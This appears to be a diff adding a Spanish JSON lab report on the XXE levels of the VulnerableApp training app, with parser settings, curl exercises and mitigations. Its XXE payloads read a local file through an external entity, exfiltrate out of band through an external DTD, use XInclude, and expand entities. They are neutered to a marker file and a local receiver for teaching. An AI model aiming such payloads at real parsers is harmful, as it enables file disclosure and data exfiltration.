@@ -1,0 +1,366 @@
+{
+  "id": "xxe",
+  "title": "XML External Entity (XXE): siete niveles del laboratorio VulnerableApp",
+  "concept": "Informe verificado por lectura de código del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a. El controlador XXEVulnerability está anotado con @VulnerableAppRestController(value=XXEVulnerability) y cada método usa @VulnerableAppRequestMapping(value=LEVEL_n, requestMethod=POST); aplicando el prefijo indicado por el laboratorio, las rutas son /VulnerableApp/XXEVulnerability/LEVEL_n. El cuerpo es XML crudo application/xml con un elemento raíz book y los campos name, isbn, author, publisher y others. LEVEL_1 deserializa sin restricciones; LEVEL_2 sólo desactiva entidades externas generales y deja abierta la vía de entidades de parámetro/DTD externo; LEVEL_3 desactiva entidades generales y de parámetro pero todavía permite DOCTYPE y no configura un límite de expansión; LEVEL_4 rechaza DOCTYPE y desactiva las fuentes externas; LEVEL_5 conserva esas defensas y además activa namespace awareness y desactiva XInclude; LEVEL_6 permite expansión sin límite de entidad a nivel del XMLReader, con semáforo de una solicitud y timeout cooperativo de 2 segundos; LEVEL_7 desactiva entidades externas, desactiva XInclude y fija un límite programático de expansión de 20. La etiqueta SECURE de la anotación aparece en LEVEL_3, LEVEL_4, LEVEL_5 y LEVEL_7. La clasificación vulnerable se refiere al comportamiento de seguridad de cada configuración, no a que una petición concreta haya sido ejecutada en este entorno.",
+  "source_files": [
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/XXEVulnerability.java#L55-L405",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/TimeoutInputStream.java#L8-L42",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/TimingXMLFilter.java#L8-L48",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/bean/Book.java#L37-L147",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/bean/ObjectFactory.java#L25-L45",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/dao/BookEntity.java#L12-L44",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/xxe/dao/BookEntityRepository.java#L1-L8",
+    "/home/ubuntu/workshop-research/upstream/src/test/java/org/sasanlabs/service/vulnerability/xxe/XXEVulnerabilityTest.java#L28-L611",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/scripts/XXEVulnerability/books.xsd#L1-L12",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/scripts/XXEVulnerability/schema.sql#L1-L15",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/XXEVulnerability/LEVEL_1/XXE.html#L1-L25",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/XXEVulnerability/LEVEL_1/XXE.js#L8-L81",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/i18n/messages.properties#L152-L158,L1177-L1179,L1284-L1312",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/scanner/sast/expectedIssues.csv#L105-L106",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/internal/utility/LevelConstants.java#L9-L15",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/internal/utility/annotations/VulnerableAppRequestMapping.java#L10-L55",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/internal/utility/annotations/VulnerableAppRestController.java#L10-L36"
+  ],
+  "levels": [
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_1",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo; raíz book; campos name, isbn, author, publisher y others",
+        "content_type": "application/xml"
+      },
+      "behavior": "Lee request.getInputStream(), crea un JAXBContext/Unmarshaller y hace unmarshal directo sin SAXParserFactory configurada. El constructor deja javax.xml.accessExternalDTD=all; por tanto una entidad externa general declarada con SYSTEM puede resolverse y su contenido puede terminar en el Book y en la respuesta JSON. Luego guarda BookEntity con levelIdentifier LEVEL_1.",
+      "vulnerable": true,
+      "notes": "La fuente de traducciones describe este nivel como sin validación. El ejercicio seguro usa únicamente file:///tmp/va-training.txt, que la imagen del laboratorio debe contener con VA_LAB_FILE; no se debe sustituir por rutas del sistema. Si JAXB o el runtime rechazan el XML, el método captura la excepción, registra el error y devuelve HTTP 200 con isValid=false, por lo que un 200 no demuestra lectura."
+    },
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_2",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo con posibilidad de DOCTYPE; raíz book y campos de libro",
+        "content_type": "application/xml"
+      },
+      "behavior": "Construye SAXParserFactory y sólo establece external-general-entities=false antes de pasar el XMLReader a JAXB. Una referencia general directa no debería expandirse, pero external-parameter-entities queda con su configuración por defecto y la fuente de traducciones documenta el patrón de DTD externo con entidades de parámetro que puede causar una solicitud saliente y exfiltrar sólo el marcador del archivo de entrenamiento al receiver local.",
+      "vulnerable": true,
+      "notes": "Es la separación importante entre entidades generales (&name;) y entidades de parámetro (%name;). Para demostrarla sin un servidor atacante se requiere que el receptor inocuo en receiver:8081 sirva un DTD de entrenamiento predeterminado y registre la solicitud; si esa ruta no existe, el comportamiento OOB no puede concluirse desde curl."
+    },
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_3",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo; puede incluir DOCTYPE y entidades, pero la configuración bloquea entidades externas generales y de parámetro",
+        "content_type": "application/xml"
+      },
+      "behavior": "Desactiva external-general-entities y external-parameter-entities, pero deja que el parser vea DOCTYPE. Las entidades externas no deberían seguirse para leer archivos ni para llegar al receiver; sin embargo no se establece un límite de expansión de entidades, así que el código conserva una superficie de expansión interna potencialmente costosa.",
+      "vulnerable": false,
+      "notes": "SECURE en la anotación sólo respecto del ataque XXE externo. La propia traducción del nivel advierte que permitir DOCTYPE no es una defensa completa frente a XML entity expansion/denial of service. No se debe intentar una bomba; el ejercicio usa una entidad externa que apunta sólo al receptor local como control negativo."
+    },
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_4",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo; sólo XML sin DOCTYPE debe ser aceptado",
+        "content_type": "application/xml"
+      },
+      "behavior": "Configura disallow-doctype-decl=true, external-general-entities=false, external-parameter-entities=false y load-external-dtd=false. Un documento que contenga cualquier DOCTYPE debe fallar durante el parseo; un documento XML normal sin DOCTYPE puede convertirse en Book y guardarse.",
+      "vulnerable": false,
+      "notes": "Es la defensa recomendada cuando la aplicación no necesita declaraciones DOCTYPE. El método captura la excepción y aun así responde HTTP 200 con un bean inválido, por lo que el indicador útil es el JSON isValid=false/content=null, no solamente el código HTTP."
+    },
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_5",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo; sin DOCTYPE para el caso normal; XInclude explícitamente desactivado",
+        "content_type": "application/xml"
+      },
+      "behavior": "Repite las defensas de LEVEL_4, activa namespaceAware=true y setXIncludeAware(false). La intención es cerrar también la inclusión XInclude que no necesita DOCTYPE. Un XML normal debe seguir funcionando; una inclusión xi:include hacia el archivo de entrenamiento no debe sustituirse por VA_LAB_FILE.",
+      "vulnerable": false,
+      "notes": "El test existente cubre configuración segura básica de otros niveles, pero no aporta una prueba de endpoint para XInclude en LEVEL_5. El resultado concreto de un xi:include anidado puede ser un Book inválido o un campo vacío según JAXB; la verificación segura debe ser ausencia de VA_LAB_FILE y no un supuesto exacto sobre isValid."
+    },
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_6",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo con expansión interna pequeña y acotada; no usar XML bomb",
+        "content_type": "application/xml"
+      },
+      "behavior": "Adquiere un Semaphore de un permiso; si está ocupado devuelve 429. Para la petición usa TimeoutInputStream y TimingXMLFilter con 2000 ms, crea un XMLReader y establece entityExpansionLimit=0 (primero propiedad Oracle, luego jdk.xml), que en el runtime previsto significa sin límite. No desactiva entidades externas. El timeout y el semáforo reducen el impacto operativo, pero no convierten la configuración en una defensa completa.",
+      "vulnerable": true,
+      "notes": "El nivel se diseñó alrededor de Billion Laughs/XML Bomb, pero este informe no reproduce una denegación de servicio. Los tests sólo usan una expansión de cinco repeticiones y comprueban el límite de concurrencia, el cierre del stream y el timeout. La clasificación vulnerable cubre el límite relajado y la ausencia de flags externos."
+    },
+    {
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_7",
+      "method": "POST",
+      "parameters": {
+        "query": {},
+        "form": {},
+        "body": "XML crudo con expansión pequeña o DOCTYPE no externo; límite de expansión configurado en 20",
+        "content_type": "application/xml"
+      },
+      "behavior": "Desactiva entidades externas generales y de parámetro, evita carga de DTD externo, activa namespace awareness, desactiva XInclude y establece entityExpansionLimit=20. No marca disallow-doctype-decl, por lo que un DOCTYPE puede ser leído mientras las entidades externas permanezcan bloqueadas; la expansión interna debe mantenerse bajo el límite.",
+      "vulnerable": false,
+      "notes": "SECURE respecto de acceso externo y expansión no acotada. El límite depende del parser/runtime y la función falla si no reconoce ninguna de las propiedades; el método devuelve entonces el bean inválido. El ejercicio no intenta superar el umbral ni provocar carga elevada."
+    }
+  ],
+  "exercises": [
+    {
+      "title": "LEVEL_1 positivo: entidad externa local con marcador inocuo",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_1",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE book [<!ENTITY xxe SYSTEM \"file:///tmp/va-training.txt\">]><book><name>ok</name><isbn>1</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>",
+      "content_type": "application/xml",
+      "expected": "Si la imagen contiene exactamente /tmp/va-training.txt con el marcador VA_LAB_FILE y el runtime resuelve DTD externas, el campo content.others podría contener VA_LAB_FILE. Es una expectativa derivada del código, no una afirmación de que la petición ya funcionó.",
+      "check": {
+        "kind": "json",
+        "path": "content.others",
+        "value": "VA_LAB_FILE"
+      },
+      "explanation": "LEVEL_1 usa JAXB directamente y el constructor habilita acceso externo DTD. La entidad sólo lee el archivo de entrenamiento autorizado; el resultado esperado hace visible la diferencia entre un XML literal y la sustitución de una entidad. Usar others evita depender de una columna name de 30 caracteres.",
+      "mitigation": "No usar un Unmarshaller sin una configuración segura. Rechazar DOCTYPE si no es necesario; si es necesario, desactivar entidades externas generales y de parámetro, la carga de DTD externo, XInclude y aplicar un límite de expansión. Validar también el esquema y mantener una política de resolución externa por defecto deny.",
+      "steps": [
+        "Precondición del laboratorio: la imagen ya contiene /tmp/va-training.txt con el texto VA_LAB_FILE. No cambies la ruta por /etc/passwd, /etc/hostname ni ningún secreto.",
+        "Desde Kali, enviar el XML real: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_1 -H 'Content-Type: application/xml' --data-binary @- <<'XML'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE book [<!ENTITY xxe SYSTEM \"file:///tmp/va-training.txt\">]><book><name>ok</name><isbn>1</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>\nXML",
+        "Comparar con un control negativo seguro en la misma ruta: enviar el mismo libro sin DOCTYPE ni &xxe; y comprobar que el flujo normal puede devolver isValid=true. La comparación no demuestra por sí sola una lectura si el servicio no devuelve content.others.",
+        "Evaluar el check JSON sólo si la respuesta es JSON y contiene content.others. Un HTTP 200 por sí solo no prueba que se haya expandido la entidad: el catch del código devuelve 200 también cuando el parseo falla."
+      ],
+      "hints": [
+        "La ruta es POST; no uses --get para este endpoint.",
+        "El marcador permitido es exactamente VA_LAB_FILE y el campo de mayor capacidad es others.",
+        "Una respuesta con error o con isValid=false es evidencia de que el caso no se verificó, no de una mitigación universal."
+      ]
+    },
+    {
+      "title": "LEVEL_2 control negativo/positivo: entidades de parámetro hacia el receptor local",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_2",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE book SYSTEM \"http://receiver:8081/xxe-training.dtd\"><book><name>ok</name><isbn>2</isbn><author>a</author><publisher>p</publisher><others>receiver-control</others></book>",
+      "content_type": "application/xml",
+      "expected": "Si receiver:8081/xxe-training.dtd es un recurso de entrenamiento preconfigurado que declara %file con file:///tmp/va-training.txt y hace que el parser solicite sólo http://receiver:8081/xxe-marker?x=VA_LAB_FILE, el receptor debería registrar esa solicitud. El cuerpo de respuesta no tiene que contener el marcador. Si receiver no sirve ese DTD, no se puede atribuir ningún resultado al nivel.",
+      "check": {
+        "kind": "manual",
+        "value": "Revisar en el receptor inocuo que no llegó ninguna solicitud de xxe-marker en el control sin DOCTYPE y que, con el DOCTYPE SYSTEM de entrenamiento, sólo llegó una solicitud local autorizada cuyo valor observado es VA_LAB_FILE; no usar un dominio externo ni un archivo distinto."
+      },
+      "explanation": "La configuración sólo bloquea external-general-entities. El patrón documentado por el propio recurso de mensajes requiere un DTD externo para que la cadena de entidades de parámetro sea XML bien formado. Se observa el efecto fuera de banda en receiver, no se intenta que la aplicación devuelva el contenido del archivo.",
+      "mitigation": "Además de external-general-entities=false, establecer external-parameter-entities=false y load-external-dtd=false; usar un resolver externo que rechace por defecto y validar el esquema. Mantener la salida de red del servicio restringida incluso después de corregir el parser.",
+      "steps": [
+        "Precondición: el receiver inocuo debe servir sólo el DTD de entrenamiento acordado en /xxe-training.dtd y registrar solicitudes en /xxe-marker; si no tiene ese recurso, omitir la conclusión de comportamiento OOB. El DTD debe leer únicamente file:///tmp/va-training.txt y enviar sólo el marcador VA_LAB_FILE al mismo receiver.",
+        "Control negativo desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_2 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><book><name>control</name><isbn>2</isbn><author>a</author><publisher>p</publisher><others>no-dtd</others></book>' y revisar que el receptor no registre xxe-marker.",
+        "Caso de entrenamiento desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_2 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE book SYSTEM \"http://receiver:8081/xxe-training.dtd\"><book><name>ok</name><isbn>2</isbn><author>a</author><publisher>p</publisher><others>receiver-control</others></book>'",
+        "Verificar manualmente sólo en receiver:8081 si hubo la solicitud autorizada. Un HTTP 200 de target no demuestra que la DTD se cargó ni que se produjo exfiltración; el método convierte excepciones en 200/isValid=false."
+      ],
+      "hints": [
+        "No pongas %file dentro de otra declaración del subconjunto interno: el propio recurso de mensajes advierte que esa forma no es XML bien formado.",
+        "El receptor es local y de laboratorio; no sustituyas receiver por attacker.example ni por Internet.",
+        "La ausencia de una entrada en el receptor sólo es interpretable si se confirmó primero que su DTD de entrenamiento existe y registra solicitudes."
+      ]
+    },
+    {
+      "title": "LEVEL_3 negativo: entidades externas desactivadas, sin leer ni llamar al receptor",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_3",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY xxe SYSTEM \"http://receiver:8081/xxe-level3?marker=VA_LAB_OK\">]><book><name>ok</name><isbn>3</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>",
+      "content_type": "application/xml",
+      "expected": "La configuración fuente desactiva external-general-entities y external-parameter-entities; no debería observarse una solicitud a receiver:8081/xxe-level3 ni aparecer un contenido externo. JAXB puede producir un Book válido con campo vacío, una referencia no expandida o un bean inválido según parser/runtime.",
+      "check": {
+        "kind": "not_contains",
+        "value": "VA_LAB_OK"
+      },
+      "explanation": "Este es el control positivo de la defensa respecto de acceso externo: se usa un URI local inocuo, no un secreto. LEVEL_3 permite DOCTYPE, por lo que el resultado no debe confundirse con el rechazo total de LEVEL_4; su debilidad residual es la expansión interna no acotada.",
+      "mitigation": "Conservar ambas flags de entidades externas en falso, impedir DTD externos y añadir límite de expansión; si la aplicación no necesita DOCTYPE, preferir la estrategia de LEVEL_4. Aplicar además límites de tamaño y tiempo fuera del parser.",
+      "steps": [
+        "Registrar el estado inicial del receptor inocuo, sin generar tráfico externo. El URI usado sólo contiene el marcador benigno VA_LAB_OK.",
+        "Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_3 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY xxe SYSTEM \"http://receiver:8081/xxe-level3?marker=VA_LAB_OK\">]><book><name>ok</name><isbn>3</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>'",
+        "Comprobar que la respuesta, si es JSON, no contiene VA_LAB_OK y revisar opcionalmente los registros del receptor para confirmar ausencia de /xxe-level3. Repetir con XML normal sin DOCTYPE como control positivo de funcionamiento de negocio.",
+        "No interpretar un content vacío, una referencia textual o un 200 como prueba absoluta de seguridad: el check sólo verifica que el marcador no apareció y la observación OOB depende de los logs del receptor."
+      ],
+      "hints": [
+        "El objetivo es un control negativo de resolución externa, no una prueba de XML bomb.",
+        "La etiqueta SECURE de este nivel no elimina el riesgo de expansión interna no acotada.",
+        "No medir seguridad por hacer clic en la UI; la evidencia debe ser la respuesta estructurada y, para OOB, el receptor."
+      ]
+    },
+    {
+      "title": "LEVEL_4 negativo: cualquier DOCTYPE es rechazado",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_4",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY local \"DOCTYPE_PRESENT\">]><book><name>ok</name><isbn>4</isbn><author>a</author><publisher>p</publisher><others>&local;</others></book>",
+      "content_type": "application/xml",
+      "expected": "El parser debería rechazar el documento antes de deserializarlo porque contiene DOCTYPE, aunque la entidad sea interna y no acceda a un recurso. El código fuente devuelve HTTP 200 en el catch y un bean con isValid=false/content=null.",
+      "check": {
+        "kind": "json",
+        "path": "isValid",
+        "value": false
+      },
+      "explanation": "El caso prueba la diferencia entre desactivar entidades y prohibir la construcción completa de DOCTYPE. Es seguro porque la entidad sólo contiene la palabra DOCTYPE_PRESENT y nunca apunta a file, http o un recurso de red.",
+      "mitigation": "Mantener disallow-doctype-decl=true cuando la aplicación no requiere DOCTYPE. Para entradas XML rechazadas, usar un código de error HTTP coherente en una aplicación real y no ocultar fallos de validación bajo un 200 ambiguo.",
+      "steps": [
+        "Control positivo de negocio: primero enviar un <book> normal sin DOCTYPE a LEVEL_4 y verificar, si el runtime lo permite, isValid=true y un content no nulo.",
+        "Caso seguro desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_4 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY local \"DOCTYPE_PRESENT\">]><book><name>ok</name><isbn>4</isbn><author>a</author><publisher>p</publisher><others>&local;</others></book>'",
+        "Comprobar el JSON isValid=false y content=null. Si la capa HTTP transforma la respuesta, conservar el cuerpo crudo y no reemplazar esta verificación por el código 200.",
+        "No añadir una entidad externa para hacer la prueba más fuerte: la prohibición de DOCTYPE ya es el comportamiento que se quiere verificar."
+      ],
+      "hints": [
+        "La comprobación correcta es el cuerpo JSON, no un status 200.",
+        "Un DOCTYPE inofensivo basta para probar disallow-doctype-decl.",
+        "La ausencia de una navegación de UI no invalida el resultado; el endpoint acepta POST XML."
+      ]
+    },
+    {
+      "title": "LEVEL_5 negativo: XInclude local no debe insertar el marcador",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_5",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><book xmlns:xi=\"http://www.w3.org/2001/XInclude\"><name><xi:include href=\"file:///tmp/va-training.txt\" parse=\"text\"/></name><isbn>5</isbn><author>a</author><publisher>p</publisher><others>xinclude-control</others></book>",
+      "content_type": "application/xml",
+      "expected": "No debería aparecer VA_LAB_FILE en la respuesta porque setXIncludeAware(false) impide procesar la directiva. Según JAXB/parser, el documento puede ser inválido por el elemento hijo inesperado o puede producir un name vacío; ambas variantes son compatibles con la ausencia del marcador.",
+      "check": {
+        "kind": "not_contains",
+        "value": "VA_LAB_FILE"
+      },
+      "explanation": "El caso cubre la defensa adicional que distingue LEVEL_5 de una simple prohibición de DOCTYPE: xi:include no necesita una declaración DOCTYPE. Sólo referencia el archivo de entrenamiento permitido y no un archivo del host.",
+      "mitigation": "Mantener XInclude desactivado en parsers que procesen XML no confiable, además de las defensas de DTD/entidades externas. Rechazar elementos inesperados mediante validación de esquema y política de namespaces.",
+      "steps": [
+        "Precondición: no cambiar file:///tmp/va-training.txt; debe ser el marcador autorizado VA_LAB_FILE.",
+        "Control positivo de negocio: enviar primero XML normal sin xi:include a LEVEL_5 y observar sólo que el flujo de libro puede funcionar; no usar ese 200 como prueba de que XInclude está deshabilitado.",
+        "Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_5 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><book xmlns:xi=\"http://www.w3.org/2001/XInclude\"><name><xi:include href=\"file:///tmp/va-training.txt\" parse=\"text\"/></name><isbn>5</isbn><author>a</author><publisher>p</publisher><others>xinclude-control</others></book>'",
+        "Buscar VA_LAB_FILE en el cuerpo JSON y, si es necesario, clasificar manualmente isValid/content por separado. El check sólo demuestra que el marcador no fue reflejado; no promete que cada implementación JAXB produzca la misma forma de error."
+      ],
+      "hints": [
+        "XInclude es una característica distinta de las entidades XML.",
+        "La prueba es segura sólo con el archivo de entrenamiento autorizado.",
+        "No uses un click en la UI como criterio de éxito o fracaso; captura el POST y el JSON."
+      ]
+    },
+    {
+      "title": "LEVEL_6 control seguro: expansión interna pequeña, nunca XML bomb",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_6",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY p \"VA_LAB_OK\"><!ENTITY p1 \"&p;&p;&p;&p;&p;\">]><book><name>&p1;</name><isbn>6</isbn><author>a</author><publisher>p</publisher><others>small-expansion</others></book>",
+      "content_type": "application/xml",
+      "expected": "El caso pequeño debería poder procesarse y producir content.name igual a VA_LAB_OKVA_LAB_OKVA_LAB_OKVA_LAB_OKVA_LAB_OK si el parser acepta la configuración de entityExpansionLimit=0. No se debe extrapolar este éxito a cargas grandes ni intentar una Billion Laughs.",
+      "check": {
+        "kind": "json",
+        "path": "content.name",
+        "value": "VA_LAB_OKVA_LAB_OKVA_LAB_OKVA_LAB_OKVA_LAB_OK"
+      },
+      "explanation": "El test existente usa precisamente una expansión de cinco repeticiones para verificar el flujo normal. Aquí se conserva esa escala mínima y se evita cualquier payload de agotamiento de CPU/memoria. El nivel sigue siendo riesgoso porque configura el límite en cero/sin límite y no desactiva entidades externas.",
+      "mitigation": "Usar un límite bajo y probado de expansión, como la intención de LEVEL_7, desactivar entidades externas/DTD/XInclude y aplicar límites de tamaño/tiempo. El semáforo y timeout de este nivel son defensas operativas complementarias, no sustitutos de configuración segura.",
+      "steps": [
+        "No ejecutar payloads de Billion Laughs, anidamientos grandes ni solicitudes concurrentes. Este ejercicio tiene sólo cinco repeticiones literales.",
+        "Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_6 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY p \"VA_LAB_OK\"><!ENTITY p1 \"&p;&p;&p;&p;&p;\">]><book><name>&p1;</name><isbn>6</isbn><author>a</author><publisher>p</publisher><others>small-expansion</others></book>'",
+        "Comprobar el valor JSON exacto de content.name si la respuesta es válida. Como control negativo de concurrencia, una segunda petición simultánea puede devolver 429, pero no es necesario generarla ni se debe usar carga para forzar ese estado.",
+        "Si devuelve 200/isValid=false o si la propiedad de parser no está soportada, registrar esa incertidumbre; no repetir aumentando la carga."
+      ],
+      "hints": [
+        "La palabra clave es pequeña: cinco expansiones, no una bomba.",
+        "Un 429 puede ser una defensa del semáforo, no una prueba de vulnerabilidad.",
+        "Un resultado válido no prueba que el timeout detendría cualquier entrada maliciosa."
+      ]
+    },
+    {
+      "title": "LEVEL_7 negativo: entidad externa local bloqueada con expansión limitada",
+      "route": "/VulnerableApp/XXEVulnerability/LEVEL_7",
+      "method": "POST",
+      "params": {
+        "query": {},
+        "form": {},
+        "body_encoding": "raw XML"
+      },
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY xxe SYSTEM \"file:///tmp/va-training.txt\">]><book><name>ok</name><isbn>7</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>",
+      "content_type": "application/xml",
+      "expected": "El código desactiva external-general-entities y external-parameter-entities y no carga DTD externos; no debería aparecer VA_LAB_FILE en la respuesta. Un XML normal o una expansión interna pequeña debe seguir siendo el control positivo de funcionamiento, sin superar el límite 20.",
+      "check": {
+        "kind": "not_contains",
+        "value": "VA_LAB_FILE"
+      },
+      "explanation": "El DOCTYPE se deja presente para comprobar que LEVEL_7 no depende sólo de rechazarlo: la entidad externa apunta al único archivo de entrenamiento permitido y la salida esperada no debe contener el marcador. La configuración de límite se mantiene, pero el ejercicio no intenta alcanzar el umbral.",
+      "mitigation": "Mantener las dos flags de entidades externas en falso, la carga de DTD externo desactivada, XInclude desactivado y un límite de expansión probado. Si DOCTYPE no es necesario, añadir también disallow-doctype-decl para reducir superficie.",
+      "steps": [
+        "Precondición: usar sólo file:///tmp/va-training.txt con VA_LAB_FILE; no cambiar el URI por otra ruta.",
+        "Control positivo de negocio: enviar un libro XML sin DOCTYPE a LEVEL_7 y observar que una entrada normal puede ser válida. No se debe crear carga para probar el límite 20.",
+        "Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_7 -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY xxe SYSTEM \"file:///tmp/va-training.txt\">]><book><name>ok</name><isbn>7</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>'",
+        "Confirmar que el cuerpo no contiene VA_LAB_FILE. Si la respuesta es inválida por diferencias del parser, anotar isValid/content y no repetir con una expansión mayor; la ausencia del marcador es el único check automatizado propuesto."
+      ],
+      "hints": [
+        "LEVEL_7 permite DOCTYPE, pero no debería resolver la entidad externa.",
+        "El límite 20 no se valida provocando una expansión por encima del umbral.",
+        "Reflejar o no reflejar el marcador no debe evaluarse por clicks; usa el JSON crudo."
+      ]
+    }
+  ],
+  "limitations": [
+    "Este documento es una revisión estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a; no afirma que se hayan ejecutado target, Mailpit o receiver ni que un ejercicio haya funcionado en el runtime desplegado.",
+    "Todas las rutas de esta familia son POST según las anotaciones. Los comandos usan curl -X POST y --data-binary; curl --get sería un método incorrecto para comprobar el comportamiento de estos métodos.",
+    "El código captura la mayoría de excepciones y devuelve HTTP 200 con GenericVulnerabilityResponseBean isValid=false/content=null. Por ello un 200 no prueba aceptación, expansión de entidad ni ausencia de vulnerabilidad.",
+    "Un reflejo de texto en JSON o HTML no prueba ejecución XSS; aquí no se usa JavaScript, no se roban cookies y no se debe atribuir puntaje por hacer click. Para este XML, verificar valores JSON y los logs del receptor cuando el comportamiento es fuera de banda.",
+    "La ausencia de un registro en receiver sólo es evidencia si se confirmó que la ruta de DTD/endpoint de entrenamiento existe, es local, registra solicitudes y responde de forma controlada. La revisión no inventa el contrato de receiver: si no expone /xxe-training.dtd, LEVEL_2 queda como ejercicio condicionado y no como resultado observado.",
+    "Mailpit no es necesario para los siete métodos XXE analizados: el código sólo guarda BookEntity y no contiene envío de correo. No se propone usar Mailpit como verificador de esta familia.",
+    "El archivo /tmp/va-training.txt y el marcador VA_LAB_FILE son una precondición de laboratorio; no se leen secretos del host ni se incluyen rutas como /etc/passwd, /etc/hostname, win.ini u otros archivos sensibles.",
+    "Los mensajes del repositorio describen payloads pedagógicos más agresivos, incluido Billion Laughs y una lectura de /etc/hostname, pero este informe los sustituye por controles seguros. No se incluyen DoS, reverse shells, comandos externos, borrado de datos ni servidores atacantes.",
+    "El test de LEVEL_3 sólo comprueba que un contenido malicioso no aparece como valor esperado y los tests de LEVEL_6/LEVEL_7 usan expansiones pequeñas. Las diferencias de JDK, JAXB, SAXParserFactory y propiedades entityExpansionLimit pueden cambiar si el resultado es un bean válido, vacío o inválido.",
+    "La anotación SECURE expresa la variante pedagógica del repositorio y no sustituye una revisión de límites de tamaño, timeouts de servidor, validación de esquema, política de salida de red, observabilidad y pruebas del runtime exacto.",
